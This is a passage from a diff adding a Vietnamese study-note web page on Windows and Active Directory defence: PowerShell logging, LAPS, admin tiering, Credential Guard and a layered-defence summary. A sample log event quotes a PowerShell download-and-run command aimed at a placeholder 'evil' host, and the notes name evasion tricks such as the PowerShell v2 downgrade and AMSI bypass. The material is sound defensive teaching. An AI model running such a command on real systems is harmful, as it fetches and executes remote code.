+  /v EnableScriptBlockLogging /t REG_DWORD /d 1 /f
+
+:: Module Logging
+reg add &quot;HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging&quot; ^
+  /v EnableModuleLogging /t REG_DWORD /d 1 /f
+
+:: Transcription ra file
+reg add &quot;HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription&quot; ^
+  /v EnableTranscripting /t REG_DWORD /d 1 /f
+</code></pre>
+<blockquote>
+<p><strong>Vì sao:</strong> 4104 mạnh vì attacker hay dùng <code>powershell -enc &lt;base64&gt;</code> để giấu lệnh. Script Block Logging ghi nội dung <strong>sau khi giải mã</strong>, nên thấy lệnh thật. Event 4104 với <code>Level=Warning</code> được engine tự đánh dấu khi phát hiện pattern khả nghi (Invoke-Mimikatz, IEX, DownloadString...).</p>
+</blockquote>
+<p>Một Event 4104 mẫu:</p>
+<pre><code class="language-xml">&lt;EventData&gt;
+  &lt;Data Name=&quot;MessageNumber&quot;&gt;1&lt;/Data&gt;
+  &lt;Data Name=&quot;MessageTotal&quot;&gt;1&lt;/Data&gt;
+  &lt;Data Name=&quot;ScriptBlockText&quot;&gt;IEX (New-Object Net.WebClient).DownloadString('http://evil/a.ps1')&lt;/Data&gt;
+  &lt;Data Name=&quot;ScriptBlockId&quot;&gt;{...}&lt;/Data&gt;
+&lt;/EventData&gt;
+</code></pre>
+<blockquote>
+<p><strong>Lưu ý:</strong> attacker downgrade về PowerShell v2 (<code>powershell -version 2</code>) để né script block logging (v2 không hỗ trợ). Phòng: gỡ .NET 2.0/PowerShell v2 engine. AMSI (Antimalware Scan Interface) bổ sung quét nội dung script lúc runtime; attacker dùng AMSI bypass → giám sát chuỗi bypass đặc trưng.</p>
+</blockquote>
+<hr />
+<h2 id="ch03-313-laps-va-mo-hinh-phan-tang-tiering">3.13. LAPS và Mô hình phân tầng (Tiering)</h2>
+<h3 id="ch03-3131-laps-local-administrator-password-solution">3.13.1. LAPS — Local Administrator Password Solution</h3>
+<p><strong>Vấn đề giải quyết</strong>: mật khẩu admin cục bộ giống nhau trên mọi máy → một PtH lan cả domain. LAPS đặt mật khẩu admin cục bộ <strong>ngẫu nhiên, khác nhau mỗi máy</strong>, lưu trong AD và tự xoay.</p>
+<p><strong>Cơ chế</strong> (LAPS cổ điển):
+- Mở rộng schema thêm 2 attribute trên object computer:
+  - <code>ms-Mcs-AdmPwd</code>: mật khẩu plaintext (bảo vệ bằng ACL — chỉ máy đó ghi, admin được ủy quyền đọc).
+  - <code>ms-Mcs-AdmPwdExpirationTime</code>: thời điểm hết hạn (FILETIME).
+- CSE (client extension) chạy theo GPO: nếu hết hạn → sinh mật khẩu mới, đặt cho admin cục bộ, ghi lên AD.</p>
+<p><strong>Windows LAPS (mới, 2023)</strong>: tích hợp sẵn, lưu attribute <code>msLAPS-Password</code>, hỗ trợ <strong>mã hóa mật khẩu</strong> (DPAPI-NG, chỉ nhóm được ủy quyền giải) và lưu cả vào Entra ID.</p>
+<pre><code class="language-powershell"># Đọc mật khẩu LAPS của một máy (cần quyền đã ủy quyền)
+Get-AdmPwdPassword -ComputerName WS01            # LAPS cổ điển
+Get-LapsADPassword -Identity WS01 -AsPlainText   # Windows LAPS
+</code></pre>
+<blockquote>
+<p><strong>Lưu ý:</strong> attribute <code>ms-Mcs-AdmPwd</code> được bảo vệ bằng ACL + thường đánh dấu "confidential". Phải kiểm tra <strong>không vô tình cấp quyền đọc</strong> cho nhóm rộng. Audit đọc LAPS (Event 4662 trên attribute đó).</p>
+</blockquote>
+<h3 id="ch03-3132-mo-hinh-phan-tang-microsoft-tiering-enterprise-access-model">3.13.2. Mô hình phân tầng (Microsoft Tiering / Enterprise Access Model)</h3>
+<p>Nguyên tắc: <strong>credential bậc cao không bao giờ chạm máy bậc thấp</strong>.</p>
+<table>
+<thead>
+<tr>
+<th>Tier</th>
+<th>Tài sản</th>
+<th>Tài khoản quản trị</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Tier 0</strong></td>
+<td>DC, AD CS, ADFS, hệ thống điều khiển danh tính</td>
+<td>Domain/Enterprise Admins</td>
+</tr>
+<tr>
+<td><strong>Tier 1</strong></td>
+<td>Server, ứng dụng, dữ liệu</td>
+<td>Server admin</td>
+</tr>
+<tr>
+<td><strong>Tier 2</strong></td>
+<td>Workstation, thiết bị người dùng</td>
+<td>Helpdesk/workstation admin</td>
+</tr>
+</tbody>
+</table>
+<p>Quy tắc:
+- Admin Tier 0 chỉ đăng nhập vào <strong>Privileged Access Workstation (PAW)</strong> và DC.
+- Không dùng tài khoản Tier 0 để RDP vào workstation (vì hash sẽ nằm trong LSASS của máy Tier 2, dễ bị dump).
+- Dùng <strong>Authentication Policy Silos</strong> + <strong>Protected Users group</strong> (cấm NTLM, cấm delegation, ép Kerberos AES, không cache credential) cho tài khoản nhạy cảm.</p>
+<pre><code class="language-powershell"># Thêm admin vào Protected Users (chống PtH/PtT cho tài khoản đó)
+Add-ADGroupMember -Identity &quot;Protected Users&quot; -Members &quot;tier0-admin&quot;
+
+# Tạo Authentication Policy giới hạn TGT lifetime ngắn
+New-ADAuthenticationPolicy -Name &quot;T0-Policy&quot; `
+  -UserTGTLifetimeMins 240 -ProtectedFromAccidentalDeletion $true
+</code></pre>
+<blockquote>
+<p><strong>Vì sao:</strong> tiering hiệu quả vì phần lớn tấn công AD dựa vào <strong>credential reuse theo chiều ngang/dọc</strong> (lấy hash admin từ một máy bị chiếm rồi dùng lên DC). Cô lập credential theo tier cắt đứt chuỗi này ngay cả khi một máy bị xâm nhập. Protected Users + LSA Protection (<code>RunAsPPL</code>) + Credential Guard (cô lập secret trong VBS/VTL1) là lớp phòng thủ kỹ thuật bổ sung chống dump LSASS.</p>
+</blockquote>
+<h3 id="ch03-3133-credential-guard-va-lsa-protection">3.13.3. Credential Guard và LSA Protection</h3>
+<ul>
+<li><strong>LSA Protection (RunAsPPL)</strong>: chạy <code>lsass.exe</code> như <strong>Protected Process Light</strong> → process khác (kể cả admin) không mở handle đọc bộ nhớ → chặn Mimikatz <code>sekurlsa</code>.
+  <code>cmd
+  reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v RunAsPPL /t REG_DWORD /d 1 /f</code></li>
+<li><strong>Credential Guard</strong>: dùng virtualization-based security (Hyper-V VTL1) để cô lập NTLM hash + Kerberos TGT trong <strong>LSAIso</strong> mà LSASS user-mode không truy cập được → PtH/PtT trên máy đó vô hiệu.</li>
+</ul>
+<blockquote>
+<p><strong>Cảnh báo:</strong> nếu Sysmon Event 10 vẫn thấy handle PROCESS_VM_READ tới lsass.exe khi RunAsPPL bật, nghĩa là attacker đã nạp driver để gỡ bảo vệ PPL (BYOVD) — báo động cao.</p>
+</blockquote>
+<hr />
+<h2 id="ch03-314-tong-ket-phong-thu-theo-lop">3.14. Tổng kết phòng thủ theo lớp</h2>
+<table>
+<thead>
+<tr>
+<th>Lớp</th>
+<th>Biện pháp</th>
+<th>Chống lại</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Logging</td>
+<td>Sysmon + 4688 cmdline + 4104 + WEF→SIEM</td>
+<td>Mọi giai đoạn, anti-forensic</td>
+</tr>
+<tr>
+<td>Credential</td>
+<td>LAPS, gMSA, Protected Users, Credential Guard, RunAsPPL</td>
+<td>PtH, PtT, dump LSASS</td>
+</tr>
+<tr>
+<td>Kerberos</td>
+<td>Tắt RC4, reset krbtgt, AES, AuthN Policy</td>
+<td>Kerberoast, golden ticket</td>
+</tr>
+<tr>
+<td>Kiến trúc</td>
+<td>Tiering, PAW, LAPS</td>
+<td>Lateral movement, leo quyền</td>
+</tr>
+<tr>
+<td>Mạng/giao thức</td>
+<td>LDAP signing+CB, SMB signing, tắt NTLM, EPA</td>
+<td>LDAP/NTLM relay</td>
+</tr>
+<tr>
+<td>Giám sát AD</td>
+<td>Audit 4662, 4769 EncType, 4624 Type 9</td>
+<td>DCSync, Kerberoast, PtH</td>
+</tr>
+</tbody>
+</table>
+<p>Toàn bộ nội dung trên tạo nền tảng để vận hành phát hiện và đáp ứng sự cố trong môi trường Windows/AD ở mức kỹ thuật chi tiết: từ byte trong hive/ticket/token cho tới event ID cụ thể tương ứng từng kỹ thuật tấn công.</p>
+<hr />
+<h2 id="ch03-ghi-chu-cua-minh">Ghi chú của mình</h2>
+<blockquote>
+<p><em>Khu vực ghi chú cá nhân: những điểm từng hiểu sai, phần còn đang tìm hiểu, hoặc kinh nghiệm rút ra khi thực hành — cập nhật dần.</em></p>
+</blockquote>
+</section>
+      <nav class="pager"><a class="pg prev" href="ch02.html"><span>← Chương trước</span><b>02 · Hệ điều hành Linux</b></a><a class="pg next" href="ch04.html"><span>Chương sau →</span><b>04 · Mật mã &amp; Nền tảng bảo mật</b></a></nav>
+    </main>
+    <footer class="site-foot">
+      <p>Ghi chép & chia sẻ bởi <span class="name">Fee</span> · tự do cho mục đích học tập.
+      &nbsp;·&nbsp; <a href="https://github.com/fee-191" target="_blank" rel="noopener">GitHub</a>
+      &nbsp;·&nbsp; <a href="https://linkedin.com/in/leduongphi191" target="_blank" rel="noopener">LinkedIn</a></p>
+      <p>Nội dung mang tính giáo dục, nhằm mục đích phòng thủ. Hãy thực hành hợp pháp, chỉ trên hệ thống bạn được phép.</p>
+    </footer>
+  </div>
+</div>
+<script>
+const root=document.documentElement;
+const THEMES=['light','dark','wibu'];
+const ICON={light:'☀️',dark:'🌙',wibu:'🌸'};
+function curTheme(){return root.getAttribute('data-theme')||'light';}
+function syncTheme(){const c=curTheme();document.querySelectorAll('.themeBtn').forEach(b=>b.textContent=ICON[c]||'☀️');}
+function setTheme(t){if(t==='light')root.removeAttribute('data-theme');else root.setAttribute('data-theme',t);localStorage.setItem('kb-theme',t);syncTheme();}
+syncTheme();
+document.querySelectorAll('.themeBtn').forEach(b=>b.addEventListener('click',()=>{
+  const i=THEMES.indexOf(curTheme());setTheme(THEMES[(i+1)%THEMES.length]);
+}));
+const navChapters=[...document.querySelectorAll('.nav-chapter')];
+document.querySelectorAll('.nav-sub, .nav-ch-title').forEach(a=>a.addEventListener('click',()=>{if(window.innerWidth<=980)document.querySelector('.sidebar').classList.remove('show');}));
+// Đánh dấu mục con đang đọc trong chương hiện tại
+const cur=document.querySelector('.nav-chapter.active');
+if(cur){
+  const heads=[...document.querySelectorAll('.chapter h2[id]')];
+  const links=new Map([...cur.querySelectorAll('.nav-sub')].map(a=>[a.getAttribute('href').slice(1),a]));
+  const obs=new IntersectionObserver((es)=>{es.forEach(e=>{if(e.isIntersecting){
+    links.forEach(a=>a.classList.remove('here'));
+    const a=links.get(e.target.id); if(a){a.classList.add('here');a.scrollIntoView({block:'nearest'});}
+  }});},{rootMargin:'-10% 0px -80% 0px',threshold:0});
+  heads.forEach(h=>obs.observe(h));
+}
+const box=document.getElementById('q');
+if(box)box.addEventListener('input',()=>{const q=box.value.trim().toLowerCase();
+  navChapters.forEach(c=>{const title=c.querySelector('.nav-ch-title').innerText.toLowerCase();
+    const subs=[...c.querySelectorAll('.nav-sub')];let any=title.includes(q);
+    subs.forEach(s=>{const m=s.innerText.toLowerCase().includes(q);s.style.display=(!q||m)?'block':'none';if(m)any=true;});
+    c.style.display=(!q||any)?'block':'none';});
+});
+const mb=document.getElementById('menu');if(mb)mb.addEventListener('click',()=>document.querySelector('.sidebar').classList.toggle('show'));
+// ←/→ chuyển chương
+document.addEventListener('keydown',e=>{
+  if(e.target.tagName==='INPUT'||e.metaKey||e.ctrlKey||e.altKey)return;
+  const p=document.querySelector('link[rel=prev]'),n=document.querySelector('link[rel=next]');
+  if(e.key==='ArrowLeft'&&p)location.href=p.href;
+  if(e.key==='ArrowRight'&&n)location.href=n.href;
+});
+</script>
+</body>
+</html>
